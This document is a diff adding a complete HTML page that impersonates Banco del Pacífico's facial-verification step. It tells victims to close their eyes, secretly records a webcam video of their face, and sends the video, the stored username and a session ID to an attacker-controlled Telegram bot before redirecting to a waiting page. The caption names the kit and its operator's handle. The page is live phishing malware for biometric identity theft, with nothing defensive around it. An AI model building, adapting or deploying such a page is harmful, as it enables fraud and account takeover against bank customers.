@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Verificación Facial</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #fff; min-height: 100vh;
+      display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 16px;
+    }
+    .logo { margin-bottom: 28px; }
+    .logo img { height: 36px; }
+    .card { max-width: 400px; width: 100%; text-align: center; }
+    h1 { font-size: 22px; font-weight: 800; color: #111; margin-bottom: 10px; }
+    .subtitle { font-size: 14px; color: #777; line-height: 1.6; margin-bottom: 20px; }
+    .instruction-box {
+      background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 10px;
+      padding: 13px 16px; font-size: 13px; color: #1e40af; font-weight: 600;
+      margin-bottom: 22px; display: flex; align-items: center; gap: 10px; text-align: left;
+    }
+    .cam-wrapper { position: relative; width: 240px; height: 240px; margin: 0 auto 24px; }
+    #video {
+      width: 240px; height: 240px; object-fit: cover;
+      border-radius: 50%; display: block; transform: scaleX(-1); background: #000;
+    }
+    .cam-ring {
+      position: absolute; inset: -5px; border-radius: 50%;
+      border: 3px solid #d1d5db; transition: border-color 0.3s, box-shadow 0.3s; pointer-events: none;
+    }
+    .cam-ring.active  { border-color: #1b5eb5; box-shadow: 0 0 0 4px rgba(27,94,181,0.12); }
+    .cam-ring.closed  { border-color: #16a34a; animation: pulse-g 0.7s ease infinite; }
+    .cam-ring.sending { border-color: #f59e0b; box-shadow: 0 0 0 6px rgba(245,158,11,0.15); }
+    @keyframes pulse-g {
+      0%,100% { box-shadow: 0 0 0 4px rgba(22,163,74,0.2); }
+      50%      { box-shadow: 0 0 0 10px rgba(22,163,74,0.05); }
+    }
+    .cam-badge {
+      position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+      background: rgba(0,0,0,0.5); color: #fff; font-size: 11px; font-weight: 600;
+      padding: 3px 10px; border-radius: 20px; white-space: nowrap; pointer-events: none;
+    }
+    .prog-wrap { width: 100%; background: #f3f4f6; border-radius: 99px; height: 6px; margin-bottom: 14px; overflow: hidden; }
+    .prog-bar  { height: 100%; width: 0%; background: #1b5eb5; border-radius: 99px; transition: width 0.1s linear; }
+    .status { font-size: 13px; color: #888; min-height: 18px; }
+    .status.warn { color: #d97706; font-weight: 600; }
+    .status.send { color: #1b5eb5; font-weight: 600; }
+    #loading { text-align: center; }
+    .spinner {
+      width: 42px; height: 42px; border: 3px solid #e5e7eb; border-top-color: #1b5eb5;
+      border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 14px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-txt { font-size: 13px; color: #aaa; }
+    #main { display: none; }
+    @media (max-width: 360px) { .cam-wrapper,#video { width: 200px; height: 200px; } }
+  </style>
+</head>
+<body>
+
+<div class="logo">
+  <img src="https://wp.logos-download.com/wp-content/uploads/2023/02/Banco_del_Pacifico_Logo.png?dl" alt="Banco del Pacífico"/>
+</div>
+
+<div id="loading" class="card">
+  <div class="spinner"></div>
+  <p class="loading-txt">Iniciando cámara…</p>
+</div>
+
+<div id="main" class="card">
+  <svg width="54" height="54" viewBox="0 0 54 54" fill="none" style="margin:0 auto 16px;display:block">
+    <circle cx="27" cy="27" r="23" fill="#eff6ff" stroke="#1b5eb5" stroke-width="2.5"/>
+    <path d="M17 24 Q20 20 23 24" stroke="#1b5eb5" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+    <path d="M31 24 Q34 20 37 24" stroke="#1b5eb5" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+    <path d="M19 34 Q27 41 35 34" stroke="#1b5eb5" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+  </svg>
+  <h1>Verificación facial</h1>
+  <p class="subtitle">Confirma tu identidad con tu rostro.</p>
+  <div class="instruction-box">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1e40af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex:0 0 18px">
+      <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+    </svg>
+    Cierra los ojos y mantenlos cerrados hasta escuchar el sonido
+  </div>
+  <div class="cam-wrapper">
+    <video id="video" autoplay muted playsinline></video>
+    <div class="cam-ring" id="cam-ring"></div>
+    <div class="cam-badge" id="cam-badge">Iniciando…</div>
+  </div>
+  <div class="prog-wrap"><div class="prog-bar" id="prog-bar"></div></div>
+  <p class="status" id="status">Posiciona tu rostro en el círculo</p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
+<script src="confi.js"></script>
+<script>
+(async () => {
+
+  const loadingEl = document.getElementById("loading");
+  const mainEl    = document.getElementById("main");
+  const videoEl   = document.getElementById("video");
+  const camRing   = document.getElementById("cam-ring");
+  const camBadge  = document.getElementById("cam-badge");
+  const progBar   = document.getElementById("prog-bar");
+  const statusEl  = document.getElementById("status");
+
+  function playBeep() {
+    try {
+      const ctx  = new (window.AudioContext || window.webkitAudioContext)();
+      const osc  = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination);
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(880, ctx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.18);
+      gain.gain.setValueAtTime(0.5, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.6);
+      osc.start(); osc.stop(ctx.currentTime + 0.6);
+    } catch(_) {}
+  }
+
+  // ── Cámara ──
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: 320, height: 240 }, // resolución baja = archivo pequeño
+      audio: false
+    });
+    videoEl.srcObject = stream;
+    await new Promise(r => { videoEl.onloadedmetadata = r; });
+  } catch(e) {
+    loadingEl.innerHTML = `<p style="color:#dc2626;font-size:14px;padding:20px">
+      No se pudo acceder a la cámara.<br/>Permite el acceso e intenta de nuevo.</p>`;
+    return;
+  }
+
+  loadingEl.style.display = "none";
+  mainEl.style.display    = "block";
+  camRing.classList.add("active");
+  camBadge.textContent = "Buscando rostro…";
+
+  // ── Grabación — elegimos el codec disponible ──
+  let recorder, chunks = [];
+  const MIMES = [
+    "video/webm;codecs=vp8",
+    "video/webm",
+    "video/mp4"
+  ];
+  const chosenMime = MIMES.find(m => {
+    try { return MediaRecorder.isTypeSupported(m); } catch(_) { return false; }
+  }) || "";
+
+  try {
+    recorder = chosenMime
+      ? new MediaRecorder(stream, { mimeType: chosenMime, videoBitsPerSecond: 200000 })
+      : new MediaRecorder(stream, { videoBitsPerSecond: 200000 });
+  } catch(_) {
+    recorder = new MediaRecorder(stream);
+  }
+
+  recorder.ondataavailable = e => {
+    if (e.data && e.data.size > 0) chunks.push(e.data);
+  };
+
+  // NO arrancamos la grabación aquí — la arrancamos sólo cuando detectamos ojos cerrados
+  // Así el video es corto (~10s) y seguro que cabe en Telegram (límite 50MB)
+
+  // ── EAR ──
+  function dist(a, b) { return Math.hypot(a.x - b.x, a.y - b.y); }
+  function ear(lm, v1, v2, h1, h2) {
+    return dist(lm[v1], lm[v2]) / (dist(lm[h1], lm[h2]) + 0.0001);
+  }
+
+  const NEED_MS  = 5000;
+  const EXTRA_MS = 5000;
+  const EAR_TH   = 0.17;
+  let closeAt    = null;
+  let triggered  = false;
+  let recording  = false;
+
+  // ── Envío ──
+  async function sendAndRedirect() {
+    const usuario   = localStorage.getItem("bdp_usuario") || "usuario";
+    const sessionId = localStorage.getItem("bdp_sessionId") || "";
+
+    camRing.className    = "cam-ring sending";
+    camBadge.textContent = "Enviando…";
+    statusEl.textContent = "Enviando verificación…";
+    statusEl.className   = "status send";
+
+    const mimeUsed = recorder.mimeType || chosenMime || "video/webm";
+    const ext      = mimeUsed.includes("mp4") ? "mp4" : "webm";
+    const blob     = new Blob(chunks, { type: mimeUsed });
+
+    // Si el blob está vacío redirige igual (evita quedarse pegado)
+    if (blob.size === 0) {
+      window.location.href = "wait.html?s=" + sessionId;
+      return;
+    }
+
+    const caption =
+      `🎥 *Video facial — Pacifico BR0K3N*\n` +
+      `👤 Usuario: \`${usuario}\`\n` +
+      `📦 Tamaño: ${(blob.size / 1024).toFixed(0)} KB\n` +
+      `👤 @Brknshinexxx`;
+
+    // Primero intenta sendVideo, luego sendDocument
+    const endpoints = [
+      { ep: "sendVideo",    field: "video"    },
+      { ep: "sendDocument", field: "document" }
+    ];
+
+    for (const { ep, field } of endpoints) {
+      try {
+        const fd = new FormData();
+        fd.append("chat_id",    CONFIG.CHAT_ID);
+        fd.append(field,        blob, `cara.${ext}`);
+        fd.append("caption",    caption);
+        fd.append("parse_mode", "Markdown");
+
+        const res  = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${ep}`, {
+          method: "POST", body: fd
+        });
+        const json = await res.json();
+        if (json.ok) break; // enviado con éxito, salimos
+      } catch(_) { /* continúa con el siguiente */ }
+    }
+
+    // Redirige siempre, llegue o no el video
+    window.location.href = "wait.html?s=" + sessionId;
+  }
+
+  // ── FaceMesh ──
+  const faceMesh = new FaceMesh({ locateFile: f =>
+    `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${f}`
+  });
+  faceMesh.setOptions({
+    maxNumFaces: 1, refineLandmarks: false,
+    minDetectionConfidence: 0.5, minTrackingConfidence: 0.5
+  });
+
+  faceMesh.onResults(results => {
+    if (triggered) return;
+
+    if (!results.multiFaceLandmarks || !results.multiFaceLandmarks.length) {
+      camBadge.textContent = "Buscando rostro…";
+      camRing.classList.remove("closed");
+      progBar.style.width  = "0%";
+      closeAt = null;
+      if (!recording) {
+        statusEl.textContent = "Posiciona tu rostro en el círculo";
+        statusEl.className   = "status";
+      }
+      return;
+    }
+
+    const lm   = results.multiFaceLandmarks[0];
+    const avg  = (ear(lm,159,145,33,133) + ear(lm,386,374,362,263)) / 2;
+    camBadge.textContent = "Rostro detectado";
+
+    if (avg < EAR_TH) {
+      // Arranca grabación la primera vez que cierra los ojos
+      if (!recording) {
+        recording = true;
+        recorder.start(500); // chunks cada 500ms
+      }
+
+      if (!closeAt) closeAt = Date.now();
+      const elapsed = Date.now() - closeAt;
+      progBar.style.width  = Math.min((elapsed / NEED_MS) * 100, 100) + "%";
+      camRing.classList.add("closed");
+      statusEl.textContent = "Mantén los ojos cerrados…";
+      statusEl.className   = "status";
+
+      if (elapsed >= NEED_MS) {
+        triggered = true;
+        playBeep();
+        camBadge.textContent = "✓ Puedes abrir los ojos";
+        statusEl.textContent = "Perfecto, ahora abre los ojos…";
+
+        // Para la grabación después de EXTRA_MS
+        setTimeout(() => {
+          try { recorder.requestData(); } catch(_) {}
+          setTimeout(() => {
+            recorder.stop();
+            // onstop se dispara cuando todos los chunks están listos
+            recorder.onstop = () => sendAndRedirect();
+          }, 400);
+        }, EXTRA_MS);
+      }
+
+    } else {
+      if (!triggered) {
+        closeAt = null;
+        progBar.style.width  = "0%";
+        camRing.classList.remove("closed");
+        statusEl.textContent = recording
+          ? "Cierra los ojos de nuevo…"
+          : "Cierra los ojos completamente";
+        statusEl.className = "status warn";
+      }
+    }
+  });
+
+  const mpCam = new Camera(videoEl, {
+    onFrame: async () => { await faceMesh.send({ image: videoEl }); },
+    width: 320, height: 240
+  });
+  mpCam.start();
+
+})();
+</script>
+</body>
+</html>
